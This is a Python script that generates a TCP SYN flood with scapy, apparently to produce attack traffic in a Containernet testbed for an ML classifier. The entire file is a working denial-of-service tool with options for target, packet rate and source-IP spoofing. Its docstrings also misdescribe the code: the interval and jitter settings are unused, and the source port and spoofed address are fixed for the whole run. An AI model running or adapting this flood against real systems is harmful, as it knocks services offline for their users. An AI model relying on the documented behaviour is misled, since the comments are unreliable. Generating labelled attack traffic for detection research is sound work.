#!/usr/bin/env python3
"""
TCP SYN flood traffic generator for Containernet testbeds.

Designed to run inside a Docker node (e.g. h1) against another node on the
same emulated network (e.g. h2). Exposes tos/window/frame_size/ipi as CLI
flags so it lines up with the feature set used by the ML classifier in
config.toml.
"""
import argparse
import random
import time
from multiprocessing import Process
from scapy.all import IP, TCP, Ether, sendpfast, get_if_hwaddr, conf

# Minimum Ethernet+IP+TCP header size for a plain SYN (no TCP options), in bytes.
BASE_FRAME_BYTES = 14 + 20 + 20

def send_packets(packets, iface, pps):
    sendpfast(packets, loop=0, pps=pps ,iface=iface)

def syn_flood(target_ip, target_port, duration, ipi, window, tos, ttl,
              frame_size, spoof_subnet, iface, jitter, pps):
    """
    ipi: base inter-packet interval in seconds (e.g. 0.01 = ~100 pkt/s).
    jitter: fraction of ipi to randomize by (0 = perfectly constant rate,
            0.3 = realistic variance instead of a trivially-separable
            constant-rate signature).
    frame_size: desired total on-wire frame size; payload is padded to hit it.
    spoof_subnet: e.g. "10.0.0." to randomize source IP within that /24.
                  Leave None to just randomize source port (still a valid
                  SYN flood — it's the half-open backlog that matters).
    """
    payload_len = max(0, frame_size - BASE_FRAME_BYTES)
    payload = b"A" * payload_len

    src_mac = get_if_hwaddr(iface)

    dst_mac = {
        "a1-eth0": "00:00:01:00:00:11",
        "a2-eth0": "00:00:01:00:00:12",
    }.get(iface)

    if dst_mac is None:
        raise ValueError(f"No destination MAC configured for {iface}")

    src_port = random.randint(1024, 65535)
    ip_kwargs = {"dst": target_ip, "tos": tos, "ttl": ttl}
    if spoof_subnet:
        ip_kwargs["src"] = f"{spoof_subnet}{random.randint(2, 254)}"

    pkts = [
        Ether(src=src_mac, dst=dst_mac) /
        IP(**ip_kwargs) /
        TCP(sport=src_port, dport=target_port, flags="S",
            seq=random.randint(0, 2**32 - 1), window=window) /
        payload
        for _ in range(10000)
    ]

    p = Process(target=send_packets, args=(pkts,iface,pps,))
    print(f"[synflood] Start,{int(time.time())}")
    p.start()
    time.sleep(duration * 0.8)
    p.terminate()


def parse_args():
    p = argparse.ArgumentParser(description="TCP SYN flood generator")
    p.add_argument("--target", required=True, help="Target IP")
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--duration", type=int, default=60)
    p.add_argument("--ipi", type=float, default=0.01,
                    help="base inter-packet interval in seconds")
    p.add_argument("--jitter", type=float, default=0.0,
                    help="fractional jitter on ipi, e.g. 0.3 for +/-30%%")
    p.add_argument("--window", type=int, default=1024)
    p.add_argument("--tos", type=int, default=0)
    p.add_argument("--ttl", type=int, default=64)
    p.add_argument("--pps", type=int, default=500)
    p.add_argument("--frame-size", type=int, default=BASE_FRAME_BYTES,
                    help="total on-wire frame size in bytes (payload is padded to fit)")
    p.add_argument("--spoof-subnet", default=None,
                    help="e.g. 10.0.0. to randomize source IP within subnet")
    p.add_argument("--iface", default=None,
                    help="interface to send on (default: scapy's routing choice)")
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    iface = args.iface or conf.iface
    syn_flood(args.target, args.port, args.duration, args.ipi, args.window,
              args.tos, args.ttl, args.frame_size, args.spoof_subnet, iface,
              args.jitter, args.pps)